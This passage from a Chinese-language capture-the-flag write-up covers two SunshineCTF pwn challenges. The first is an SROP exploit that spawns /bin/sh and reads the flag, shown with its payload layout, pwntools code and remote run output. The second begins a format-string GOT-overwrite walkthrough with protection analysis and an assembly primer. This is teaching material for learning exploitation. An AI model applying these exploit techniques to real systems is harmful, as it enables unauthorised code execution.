整題總共只有 \textbf{3 次 read、3 次 send}（第 1 次 send 是墊檔的 24
bytes， 第 2、3 次才是 payload 的兩段），順序如下（一定要照這個順序）：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
次數
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
程式在哪個 read
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
我們送什麼
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
送完之後 \texttt{rax}
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
1 & \texttt{0x40104c} \texttt{read(0,\allowbreak{}\ \allowbreak{}rsp-\allowbreak{}0x40,\allowbreak{}\ \allowbreak{}0x18)}（leak
函式裡，先墊掉） & \texttt{b"A"*0x18}（24 bytes） & 0x18（不重要） \\
2 & \texttt{0x40104f} \texttt{read(0,\allowbreak{}\ \allowbreak{}buf,\allowbreak{}\ \allowbreak{}0x400)}（\texttt{\_\allowbreak{}start}
直接呼叫的 vuln） & \textbf{第一段 payload}：\texttt{b"B"*0x80} +
\texttt{VULN\_\allowbreak{}READ} + \texttt{SYSCALL\_\allowbreak{}RET} + \texttt{frame} +
\texttt{"/\allowbreak{}bin/\allowbreak{}sh"}（補滿 0x400） & 0x400（會被覆蓋） \\
--- & \texttt{0x40106b} 的 \texttt{ret} 彈掉我們蓋上去的
\texttt{VULN\_\allowbreak{}READ}，跳回 \texttt{0x40104f} & & \\
3 & \texttt{0x40104f} 再次 \texttt{read(0,\allowbreak{}\ \allowbreak{}buf+0x08,\allowbreak{}\ \allowbreak{}0x400)} &
\textbf{只送 15
bytes}：\texttt{b"/\allowbreak{}bin/\allowbreak{}sh\textbackslash{}\allowbreak{}x00"\ \allowbreak{}+\ \allowbreak{}b"C"*7} & \textbf{15 =
\texttt{\_\allowbreak{}\_\allowbreak{}NR\_\allowbreak{}rt\_\allowbreak{}sigreturn}} \\
--- & \texttt{0x40106b} 的 \texttt{ret} 彈掉 \texttt{SYSCALL\_\allowbreak{}RET}（＝
\texttt{0x401069}），此時 \textbf{\texttt{rsp\ \allowbreak{}=\ \allowbreak{}buf+0x90}} & & \\
--- & \texttt{0x401069} 的 \texttt{syscall}：\texttt{rax=15} → 核心從
\texttt{rsp\ \allowbreak{}=\ \allowbreak{}buf+0x90} 讀 sigframe & & \\
\end{longtable}
}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
payload 在記憶體裡的樣子（buf = leak - 0x80）：

buf+0x000  ┌─────────────────────────────────┐
           │ B B B B ... （0x80 bytes 垃圾） │  ← 第二次 read 的 15 bytes 會蓋在 buf+0x08
buf+0x080  ├─────────────────────────────────┤
           │ 0x40104f  ← 覆蓋掉的返回位址    │  ← vuln 的 ret 跳到這裡
buf+0x088  ├─────────────────────────────────┤
           │ 0x401069  ← 下一次 ret 的目標   │
buf+0x090  ├─────────────────────────────────┤
           │ SigreturnFrame (0xf8 bytes)     │  ← rt_sigreturn 就從這裡讀！
buf+0x188  ├─────────────────────────────────┤
           │ （padding）                     │
buf+0x1a0  ├─────────────────────────────────┤
           │ "/bin/sh\x00"                   │  ← frame.rdi 指向這裡
buf+0x400  └─────────────────────────────────┘
\end{Verbatim}

\textbf{關鍵細節：\texttt{rsp} 的位置。}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
ret 到 0x40104f 的時候  rsp = buf + 0x88
0x40104f 讀進來的資料從    buf + 0x08 開始（因為此刻 rsp = buf+0x88，rsi = rsp-0x80）
0x40106b 的 ret         pop 掉 buf+0x88 的值，rsp 變成 buf + 0x90
\end{Verbatim}

\begin{quote}
所以第二次那 15 bytes 會蓋在
\texttt{buf+0x08}\textasciitilde{}\texttt{buf+0x16}，也就是第一段
payload 的 padding 區， 不會碰到 \texttt{buf+0x90} 的 sigframe ------
這才是「送 15 bytes 是安全的」的真正理由。 （不是「它落在
\texttt{buf+0x00}」，而是它落在 \textbf{\texttt{buf+0x08}}，兩者都能碰到
sigframe 之前就停住。）
\end{quote}

所以我們把 \texttt{SYSCALL\_\allowbreak{}RET} 放在 \texttt{buf+0x88}（payload 的第 2
個 qword）， 就會在那一刻 \texttt{ret} 過去，而此時
\textbf{\texttt{rsp\ \allowbreak{}=\ \allowbreak{}buf\ \allowbreak{}+\ \allowbreak{}0x90}}。 \texttt{sigframe} 必須正好從
\texttt{rsp} 開始 → 所以 \texttt{FRAME\_\allowbreak{}OFF\ \allowbreak{}=\ \allowbreak{}0x90}。

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{FRAME\_OFF }\OperatorTok{=} \BaseNTok{0x90}
\NormalTok{SH\_OFF    }\OperatorTok{=} \BaseNTok{0x1A0}     \CommentTok{\# frame 約 248 bytes，擺在 0x90；字串放 0x1A0 不會打架}
\NormalTok{frame\_addr }\OperatorTok{=}\NormalTok{ buf }\OperatorTok{+}\NormalTok{ FRAME\_OFF}
\NormalTok{sh\_addr    }\OperatorTok{=}\NormalTok{ buf }\OperatorTok{+}\NormalTok{ SH\_OFF}
\end{Highlighting}
\end{Shaded}

\paragraph{\texorpdfstring{步驟 4：讓
\texttt{rax\ \allowbreak{}=\ \allowbreak{}15}}{步驟 4：讓 rax = 15}}\label{ux6b65ux9a5f-4ux8b93-rax-15}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{p.send(}\StringTok{b"/bin/sh}\CharTok{\textbackslash{}x00}\StringTok{"} \OperatorTok{+} \StringTok{b"C"} \OperatorTok{*} \DecValTok{7}\NormalTok{)   }\CommentTok{\# 剛好 15 bytes}
\end{Highlighting}
\end{Shaded}

\texttt{read()} 的回傳值就是實際讀到的 byte 數，而 \texttt{syscall}
的回傳值放在 \texttt{rax}。 所以\textbf{送剛好 15 bytes}，\texttt{rax}
就會是 15 = \texttt{\_\allowbreak{}\_\allowbreak{}NR\_\allowbreak{}rt\_\allowbreak{}sigreturn}。

\begin{quote}
這 15 bytes 會被寫到 \texttt{rsp-\allowbreak{}0x80}，此時
\texttt{rsp\ \allowbreak{}=\ \allowbreak{}buf+0x88}，所以目的地是 \textbf{\texttt{buf+0x08}}
（也就是第一段 payload 前段的 padding 區），不會碰到 \texttt{buf+0x90}
的 sigframe，安全。
\end{quote}

\paragraph{步驟 5：還原暫存器並執行
execve}\label{ux6b65ux9a5f-5ux9084ux539fux66abux5b58ux5668ux4e26ux57f7ux884c-execve}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
核心收到 syscall(15) → 從 rsp = buf+0x90 讀 sigframe
   rax = 59, rdi = &"/bin/sh", rsi = 0, rdx = 0
   rip = 0x401069 (syscall; ret)
   rsp = sh_addr + 0x200
   ↓
執行到 rip → syscall 帶著 rax=59 → execve("/bin/sh", NULL, NULL)
   ↓
shell！ (execve 成功後整個行程被換掉，後面的 ret 不會執行)
\end{Verbatim}

\begin{quote}
※提示 \textbf{\texttt{frame.\allowbreak{}rsp} 為什麼是 \texttt{sh\_\allowbreak{}addr\ \allowbreak{}+\ \allowbreak{}0x200}？}
\texttt{frame.\allowbreak{}rsp}
只要是「\textbf{合法、可寫}的位址」就好：\texttt{execve}
成功的話根本用不到它
（行程映像整個被換掉），失敗時核心才會拿它當堆疊繼續跑。 本題取
\texttt{sh\_\allowbreak{}addr\ \allowbreak{}+\ \allowbreak{}0x200\ \allowbreak{}=\ \allowbreak{}buf\ \allowbreak{}+\ \allowbreak{}0x1a0\ \allowbreak{}+\ \allowbreak{}0x200\ \allowbreak{}=\ \allowbreak{}buf\ \allowbreak{}+\ \allowbreak{}0x3a0}，
仍然落在我們那 0x400 bytes 的輸入區裡面，所以一定合法
（\texttt{0x3a0\ \allowbreak{}\textless{}\allowbreak{}\ \allowbreak{}0x400}，而且不會蓋到 \texttt{0x1a0} 的
\texttt{"/\allowbreak{}bin/\allowbreak{}sh"}）。
\end{quote}

\paragraph{步驟 6：取 flag}\label{ux6b65ux9a5f-6ux53d6-flag}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{time.sleep(}\FloatTok{0.5}\NormalTok{)                    }\CommentTok{\# 等 shell 起來}
\NormalTok{p.sendline(}\StringTok{b"cat flag.txt /flag /home/*/flag.txt 2\textgreater{}/dev/null; id; echo DONE"}\NormalTok{)}
\NormalTok{time.sleep(}\FloatTok{1.5}\NormalTok{)                    }\CommentTok{\# 等指令跑完、輸出回到我們手上}
\NormalTok{out }\OperatorTok{=}\NormalTok{ p.recvrepeat(}\DecValTok{3}\NormalTok{)              }\CommentTok{\# 一直收到「3 秒內沒有新資料」為止}
\end{Highlighting}
\end{Shaded}

\begin{quote}
※提示 \texttt{execve("/\allowbreak{}bin/\allowbreak{}sh")} 之後，我們是在跟一個 \textbf{shell}
講話，所以要\textbf{等一下}再送指令
（\texttt{time.\allowbreak{}sleep(0.\allowbreak{}5)}），送完再等它輸出（\texttt{time.\allowbreak{}sleep(1.\allowbreak{}5)}）。
\texttt{p.\allowbreak{}recvrepeat(3)} = 「一直收到 3 秒內沒有新資料為止」（等同
\texttt{recvall(timeout=3)}）， 因為我們不知道 flag 有幾個 byte。 最後用
\texttt{re.\allowbreak{}search(rb"{[}A-\allowbreak{}Za-\allowbreak{}z0-\allowbreak{}9\_\allowbreak{}{]}+\textbackslash{}\allowbreak{}\{\allowbreak{}{[}\^\allowbreak{}{}\allowbreak{}\}\allowbreak{}{]}*\textbackslash{}\allowbreak{}\}\allowbreak{}",\allowbreak{}\ \allowbreak{}out)}
把 \texttt{sun\{\allowbreak{}…\}\allowbreak{}} 從一堆輸出裡抓出來。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{7.
實際執行結果}\label{ux5be6ux969bux57f7ux884cux7d50ux679c}

遠端（\texttt{python3\ \allowbreak{}exploit.\allowbreak{}py\ \allowbreak{}REMOTE}，要在 \texttt{pwn1/}
目錄下執行）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
$ python3 exploit.py REMOTE
[+] Opening connection to chal.sunshinectf.games on port 26003: Done
[+] stack leak  = 0x7ffee35ef418
[*] vuln buffer = 0x7ffee35ef398

[+] raw output:
sun{r3caLl_ev3Ry_reGist3r_sR0p}
uid=1337(total_recall) gid=1337(total_recall) groups=1337(total_recall)
DONE

[+] FLAG: sun{r3caLl_ev3Ry_reGist3r_sR0p}
\end{Verbatim}

先跑本地確認 exploit 沒問題（\texttt{python3\ \allowbreak{}exploit.\allowbreak{}py}）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
[+] stack leak  = 0x7ffd1208cf68
[*] vuln buffer = 0x7ffd1208cee8

[+] raw output:
sun{LOCAL_DUMMY_FLAG}
uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)
DONE

[+] FLAG: sun{LOCAL_DUMMY_FLAG}
\end{Verbatim}

\begin{quote}
本地 \texttt{pwn1/\allowbreak{}flag.\allowbreak{}txt} 是主辦方附的\textbf{假
flag}（\texttt{sun\{\allowbreak{}LOCAL\_\allowbreak{}DUMMY\_\allowbreak{}FLAG\}\allowbreak{}}）， 真 flag
只在遠端；\texttt{pwn1/\allowbreak{}FLAG.\allowbreak{}txt} 才是我們打到的真答案。
\end{quote}

✓ \textbf{Flag：\texttt{sun\{\allowbreak{}r3caLl\_\allowbreak{}ev3Ry\_\allowbreak{}reGist3r\_\allowbreak{}sR0p\}\allowbreak{}}}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{8. 常見坑}\label{ux5e38ux898bux5751}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{\texttt{push\ \allowbreak{}rsp} 壓的是舊值。} 如果你以為是「壓完之後的
  \texttt{rsp}」， 整個 \texttt{leak\ \allowbreak{}-\allowbreak{}\ \allowbreak{}0x80} 的推導就會差 8。 →
  \textbf{永遠用 gdb 確認}，不要憑記憶。
\item
  \textbf{\texttt{rsp} 在 syscall 前的位置算錯。} sigframe
  必須\textbf{正好}落在 \texttt{rsp}， 差 8 bytes 就會 SIGSEGV。
  訣竅：在 \texttt{0x401069} 下中斷點，印 \texttt{\$\allowbreak{}rsp}。
\item
  \textbf{送給 \texttt{read()} 的長度要剛好。} \texttt{rax}
  是「實際讀到的\textbf{位元組數}」， 不是我們想像的數字。要
  \texttt{rax=15}，就必須讓那次 \texttt{read()} 剛好回傳 15。
  實務上：一次 \texttt{send()} 送 15 bytes，讓核心一次交付。
\item
  \textbf{\texttt{execve} 的 \texttt{argv} 可以是 \texttt{NULL}。} Linux
  允許，會當成空陣列。 有些教學會叫你放
  \texttt{{[}"/\allowbreak{}bin/\allowbreak{}sh",\allowbreak{}\ \allowbreak{}NULL{]}}，兩者都能拿到 shell。
\item
  \textbf{\texttt{execve} 之後不需要 \texttt{exit}。} 行程映像被換掉了。
\item
  \textbf{題目允許 shellcode。} 這題堆疊可執行，其實也可以把 shellcode
  寫在堆疊上 再 \texttt{ret} 過去。但既然名稱明示 SROP，就用 SROP ------
  而且 SROP 是更通用的技巧 （很多時候堆疊不可執行、又沒有 \texttt{pop}
  gadget，只能靠 SROP）。
\end{enumerate}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{9. 一頁速查}\label{ux4e00ux9801ux901fux67e5}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
漏洞       : read(0, rsp-0x80, 0x400)   → 覆蓋返回位址 (offset 0x80)
洩漏       : write(1, rsp, 8)           → 得到堆疊位址 leak
緩衝區     : buf = leak - 0x80
缺 gadget  : 沒有 pop rdi/rsi/rdx，無法用普通 ROP 設 execve 參數
解法       : SROP
   1) ret → 0x40104f (再來一次 read，長度 0x400)
   2) 準備好 15 的輸入長度 → rax = 15
   3) ret → 0x401069 (syscall; ret) → rt_sigreturn
   4) rsp = buf+0x90 擺 SigreturnFrame，rip = 0x401069，rax = 59，rdi = "/bin/sh"
   5) execve 成功 → shell
\end{Verbatim}

\begin{quote}
※注意 一定要 \texttt{cd\ \allowbreak{}pwn1/}
之後再跑（\texttt{python3\ \allowbreak{}exploit.\allowbreak{}py}）， 因為 exploit 用的是相對路徑
\texttt{./\allowbreak{}challenge}； 或直接用 \texttt{wp/\allowbreak{}run\_\allowbreak{}all.\allowbreak{}sh}（它會自動 cd
進各題目目錄）。 在 repo 根目錄執行會看到
\texttt{{[}ERROR{]}\ \allowbreak{}\textquotesingle{}\allowbreak{}./\allowbreak{}challenge\textquotesingle{}\allowbreak{}\ \allowbreak{}does\ \allowbreak{}not\ \allowbreak{}exist}。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\section{Part 3 --- pwn2 mad\_libs（Format
String）}\label{part-3-pwn2-mad_libsformat-string}

\begin{quote}
原始檔案：\texttt{pwn2/\allowbreak{}notes.\allowbreak{}md}
\end{quote}

\subsection{\texorpdfstring{SunshineCTF pwn2 --- \texttt{mad\_\allowbreak{}libs}
格式化字串漏洞完全教學}{SunshineCTF pwn2 --- mad\_libs 格式化字串漏洞完全教學}}\label{sunshinectf-pwn2-mad_libs-ux683cux5f0fux5316ux5b57ux4e32ux6f0fux6d1eux5b8cux5168ux6559ux5b78}

\begin{quote}
這份筆記寫給「完全沒聽過 ROP / 沒寫過 pwn 題」的初學者。
每一個位址、每一個 offset 都是從實際檔案反組譯／用 gdb 與
\texttt{/\allowbreak{}proc/\allowbreak{}\textless{}\allowbreak{}pid\textgreater{}\allowbreak{}/\allowbreak{}maps} 驗證出來的，不是猜的。
所有指令都可以在你自己的機器上照抄執行。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{0. 題目資訊}\label{ux984cux76eeux8cc7ux8a0a-1}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}ll@{}}
\toprule\noalign{}
項目 & 值 \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
題目 & \texttt{mad\_\allowbreak{}libs} \\
類型 & pwn / format string（格式化字串漏洞） \\
遠端 & \texttt{chal.\allowbreak{}sunshinectf.\allowbreak{}games:\allowbreak{}26001} \\
附件 &
\texttt{mad\_\allowbreak{}libs}、\texttt{libc.\allowbreak{}so.\allowbreak{}6}、\texttt{ld-\allowbreak{}linux-\allowbreak{}x86-\allowbreak{}64.\allowbreak{}so.\allowbreak{}2} \\
flag & \texttt{sun\{\allowbreak{}f1ll\_\allowbreak{}iN\_\allowbreak{}th3\_\allowbreak{}g0T\_\allowbreak{}eNtry\}\allowbreak{}} \\
\end{longtable}
}

\texttt{mad\_\allowbreak{}libs} 是一支 x86-64 ELF 執行檔，用 \texttt{file} 看：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ file mad\_libs}
\NormalTok{mad\_libs: ELF 64{-}bit LSB pie executable, x86{-}64, version 1 (SYSV),}
\NormalTok{          dynamically linked, interpreter /lib64/ld{-}linux{-}x86{-}64.so.2,}
\NormalTok{          BuildID[sha1]=91b5051029d66af2b84c86d27fac427b2d670f29,}
\NormalTok{          for GNU/Linux 3.2.0, stripped}
\end{Highlighting}
\end{Shaded}

\begin{itemize}
\tightlist
\item
  \textbf{LSB}：little-endian（低位元組存在低位址）。
\item
  \textbf{pie
  executable}：可執行檔也是「位置無關」的，載入位址每次執行都不同 → 見
  §2。
\item
  \textbf{stripped}：函式符號被拔掉了，\texttt{objdump} 看不到
  \texttt{main} 這個名字，只剩
  \texttt{\textless{}\allowbreak{}\_\allowbreak{}text+0x...\allowbreak{}\textgreater{}\allowbreak{}}。我們是在
  \texttt{.\allowbreak{}text}（0x10e0 開始）裡手動找出 \texttt{main} 的：位址
  \textbf{0x11c9}。
\end{itemize}

\paragraph{\texorpdfstring{為什麼不能直接
\texttt{./\allowbreak{}mad\_\allowbreak{}libs}}{為什麼不能直接 ./mad\_libs}}\label{ux70baux4ec0ux9ebcux4e0dux80fdux76f4ux63a5-.mad_libs}

\texttt{readelf\ \allowbreak{}-\allowbreak{}dW\ \allowbreak{}mad\_\allowbreak{}libs} 可以看到：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
0x000000000000001d (RUNPATH)  Library runpath: [$ORIGIN]
\end{Verbatim}

也就是它要求「跟我放在同一個目錄」的 \texttt{libc.\allowbreak{}so.\allowbreak{}6}。用系統的
\texttt{/\allowbreak{}lib64/\allowbreak{}ld-\allowbreak{}linux-\allowbreak{}x86-\allowbreak{}64.\allowbreak{}so.\allowbreak{}2} 去跑會因為系統 libc 版本不同而噴
\texttt{symbol\ \allowbreak{}lookup\ \allowbreak{}error}。所以我們用附件裡的 loader 手動指定：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ ./ld{-}linux{-}x86{-}64.so.2 {-}{-}library{-}path . ./mad\_libs}
\end{Highlighting}
\end{Shaded}

\begin{quote}
本機沒有 \texttt{pwninit} 也沒關係，上面這行就是最簡單的「用題目給的
libc 跑」的方法。 pwntools
寫成：\texttt{process({[}\textquotesingle{}\allowbreak{}./\allowbreak{}ld-\allowbreak{}linux-\allowbreak{}x86-\allowbreak{}64.\allowbreak{}so.\allowbreak{}2\textquotesingle{}\allowbreak{},\allowbreak{}\textquotesingle{}\allowbreak{}-\allowbreak{}\/\allowbreak{}-\allowbreak{}library-\allowbreak{}path\textquotesingle{}\allowbreak{},\allowbreak{}\textquotesingle{}\allowbreak{}.\allowbreak{}\textquotesingle{}\allowbreak{},\allowbreak{}\textquotesingle{}\allowbreak{}./\allowbreak{}mad\_\allowbreak{}libs\textquotesingle{}\allowbreak{}{]})}。
\textbf{不要 patch 執行檔}，\texttt{patchelf} 會改到 ELF，容易把 offset
弄壞。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{1.
保護機制（checksec）是什麼、對這題有什麼影響}\label{ux4fddux8b77ux6a5fux5236checksecux662fux4ec0ux9ebcux5c0dux9019ux984cux6709ux4ec0ux9ebcux5f71ux97ff}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
$ readelf -hW mad_libs | grep Type        # → DYN  → PIE
$ readelf -lW mad_libs | grep GNU_STACK   # → RW   → NX enabled
$ readelf -lW mad_libs | grep GNU_RELRO   # → 0x3da8 ~ 0x4000
$ readelf -dW mad_libs | grep BIND_NOW    # → 沒有 → Partial RELRO
\end{Verbatim}

\paragraph{(1) NX
(No-eXecute，不可執行堆疊)}\label{nx-no-executeux4e0dux53efux57f7ux884cux5806ux758a}

\texttt{GNU\_\allowbreak{}STACK\ \allowbreak{}...\allowbreak{}\ \allowbreak{}RW} 代表堆疊只有讀寫權限，沒有執行權限。
\textbf{影響}：不能把 shellcode 打進 stack 上再跳過去執行。想執行
shellcode 就得靠 \texttt{mprotect}
之類的手法，太麻煩。所以我們的目標是「呼叫 libc 裡已經寫好的
\texttt{system()}」，而不是自己塞程式碼。

\paragraph{(2)
Canary（金絲雀／堆疊保護）}\label{canaryux91d1ux7d72ux96c0ux5806ux758aux4fddux8b77}

\texttt{main} 一開始會把 \texttt{fs:\allowbreak{}0x28}（每個執行緒的 TLS
裡的一個隨機值）存到
\texttt{{[}rbp-\allowbreak{}8{]}}；函式結束前再比對一次，不一樣就呼叫
\texttt{\_\allowbreak{}\_\allowbreak{}stack\_\allowbreak{}chk\_\allowbreak{}fail} 自殺。

\textbf{影響}：任何「覆蓋到 return address
的堆疊溢出」都會被偵測到。但是！這題 \texttt{fgets(buf,\allowbreak{}\ \allowbreak{}0x100,\allowbreak{}\ \allowbreak{}stdin)}
的 size 是 256（\texttt{123e:\allowbreak{}\ \allowbreak{}mov\ \allowbreak{}esi,\allowbreak{}0x100}），\texttt{fgets} 最多讀
\textbf{255 (0xFF) 個字元}再補一個
\texttt{\textquotesingle{}\allowbreak{}\textbackslash{}\allowbreak{}0\textquotesingle{}\allowbreak{}}，所以最高只寫到
\texttt{buf{[}255{]}}（= \texttt{rbp-\allowbreak{}0x11}），離 \texttt{rbp-\allowbreak{}8} 的
canary 還有 8 bytes。所以：

\begin{quote}
\textbf{這題沒有堆疊溢出，canary 其實是打醬油的。} 唯一的洞是
\texttt{printf(buf)}。 （我們還是會把 canary
洩漏出來，一方面是教學示範，另一方面是驗證我們對堆疊配置的理解正確。）
\end{quote}

\paragraph{(3) PIE (Position Independent
Executable，位置無關執行檔)}\label{pie-position-independent-executableux4f4dux7f6eux7121ux95dcux57f7ux884cux6a94}

整個執行檔被當成 shared library 載入，每次執行的 base 都不同 →
所有「程式碼位址」和「GOT 位址」都是
\texttt{PIE\_\allowbreak{}base\ \allowbreak{}+\ \allowbreak{}固定\ \allowbreak{}offset}。

\textbf{影響}：我們想寫 \texttt{printf@GOT}（=
\texttt{PIE\_\allowbreak{}base\ \allowbreak{}+\ \allowbreak{}0x4010}），就\textbf{必須先洩漏 PIE\_base}。

※注意 \textbf{非常重要}：絕對不可以假設「PIE 跟 libc 的距離是固定的」。
實測（見
§5）本機兩者差距會變（\texttt{0x332000}、\texttt{0x333000}、\texttt{0x39a000}\ldots），而\textbf{遠端
\texttt{mad\_\allowbreak{}libs} 在 \texttt{0x5d...}、libc 在
\texttt{0x74...}，差距更是天差地遠}：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
[*] libc leak   = 0x74c6d28001ca  -> libc base = 0x74c6d27d6000
[+] main leak   = 0x5deeff4bb1c9  -> PIE  base = 0x5deeff4ba000
\end{Verbatim}

所以 libc base 和 PIE base \textbf{要各洩漏一次}。

\paragraph{(4) Partial RELRO}\label{partial-relro}

\texttt{GNU\_\allowbreak{}RELRO} 覆蓋
\texttt{0x3da8\ \allowbreak{}\textasciitilde{}\allowbreak{}\ \allowbreak{}0x4000}（\texttt{.\allowbreak{}init\_\allowbreak{}array}、\texttt{.\allowbreak{}fini\_\allowbreak{}array}、\texttt{.\allowbreak{}got}）。
\texttt{.\allowbreak{}got.\allowbreak{}plt} 從 \textbf{0x3fe8} 到 \textbf{0x4028}，\textbf{沒有}被
RELRO 保護到。

\textbf{影響}：\textbf{GOT 表可以寫！} 這是這題的關鍵。如果是 Full
RELRO（\texttt{BIND\_\allowbreak{}NOW}），GOT 會被改成唯讀，這條路就死了。

\paragraph{小結：這題唯一的路 = 用 format string 改
GOT}\label{ux5c0fux7d50ux9019ux984cux552fux4e00ux7684ux8def-ux7528-format-string-ux6539-got}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}lll@{}}
\toprule\noalign{}
保護 & 狀態 & 對解題的影響 \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
NX & 開 & 不能執行 stack 上的 shellcode → 改去 call \texttt{system} \\
Canary & 開 & 但沒有溢出，無影響 \\
PIE & 開 & \textbf{必須洩漏 PIE base} 才知道 GOT 的絕對位址 \\
RELRO & Partial & \textbf{GOT 可寫} → 可以把 \texttt{printf} 換成
\texttt{system} \\
\end{longtable}
}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{\texorpdfstring{2.
逐行組語解說（\texttt{objdump\ \allowbreak{}-\allowbreak{}d\ \allowbreak{}-\allowbreak{}M\ \allowbreak{}intel}）}{2. 逐行組語解說（objdump -d -M intel）}}\label{ux9010ux884cux7d44ux8a9eux89e3ux8aaaobjdump--d--m-intel}

\paragraph{2.1 先補基礎：x86-64 呼叫慣例（System V
ABI）}\label{ux5148ux88dcux57faux790ex86-64-ux547cux53ebux6163ux4f8bsystem-v-abi}

函式呼叫時，\textbf{前 6 個整數／指標參數}依序放在這些暫存器：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}ll@{}}
\toprule\noalign{}
參數順序 & 暫存器 \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
第 1 個 & \texttt{rdi} \\
第 2 個 & \texttt{rsi} \\
第 3 個 & \texttt{rdx} \\
第 4 個 & \texttt{rcx} \\
第 5 個 & \texttt{r8} \\
第 6 個 & \texttt{r9} \\
第 7 個以後 & 放在\textbf{堆疊}上（caller 事先 push 好） \\
\end{longtable}
}

\begin{itemize}
\tightlist
\item
  回傳值放 \textbf{\texttt{rax}}。
\item
  \textbf{\texttt{rsp}} = Stack Pointer，永遠指向堆疊頂端（最低位址）。
\item
  \textbf{\texttt{rbp}} = Base Pointer，這個函式的「框底」，用它 +
  負偏移來存取區域變數。
\item
  \texttt{rdi/\allowbreak{}rsi/\allowbreak{}rdx/\allowbreak{}rcx/\allowbreak{}r8/\allowbreak{}r9/\allowbreak{}rax} 是
  \textbf{caller-saved}：被呼叫的函式可以隨便改。
\item
  \texttt{rbx/\allowbreak{}rbp/\allowbreak{}r12\textasciitilde{}\allowbreak{}r15} 是
  \textbf{callee-saved}：被呼叫的函式要負責還原。
\end{itemize}

常用指令：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
指令
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
意思
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{push\ \allowbreak{}rbp} & \texttt{rsp\ \allowbreak{}-=\ \allowbreak{}8}，然後把 \texttt{rbp} 的值寫到
\texttt{{[}rsp{]}} \\
\texttt{pop\ \allowbreak{}rbp} & 把 \texttt{{[}rsp{]}} 讀進 \texttt{rbp}，然後
\texttt{rsp\ \allowbreak{}+=\ \allowbreak{}8} \\
\texttt{mov\ \allowbreak{}dst,\allowbreak{}\ \allowbreak{}src} & 複製（src 不動） \\
\texttt{lea\ \allowbreak{}dst,\allowbreak{}\ \allowbreak{}{[}base+off{]}} & \textbf{只算位址}（Load Effective
Address），不做記憶體讀取。\texttt{lea\ \allowbreak{}rax,{[}rbp-\allowbreak{}0x110{]}} =
把「\texttt{rbp-\allowbreak{}0x110} 這個數字」放進 \texttt{rax}（就是
\texttt{rax\ \allowbreak{}=\ \allowbreak{}\&\allowbreak{}buf}） \\
\texttt{call\ \allowbreak{}f} & \texttt{push\ \allowbreak{}下一行的位址}（返回位址）然後跳到
\texttt{f} \\
\texttt{ret} & \texttt{pop\ \allowbreak{}rip}：把 \texttt{{[}rsp{]}}
彈進指令指標，回到 caller \\
\texttt{leave} & 等於 \texttt{mov\ \allowbreak{}rsp,\allowbreak{}\ \allowbreak{}rbp} +
\texttt{pop\ \allowbreak{}rbp}（拆掉這個函式的框） \\
\texttt{sub\ \allowbreak{}rsp,\allowbreak{}\ \allowbreak{}0x120} & 在堆疊上「保留」0x120 位元組給區域變數 \\
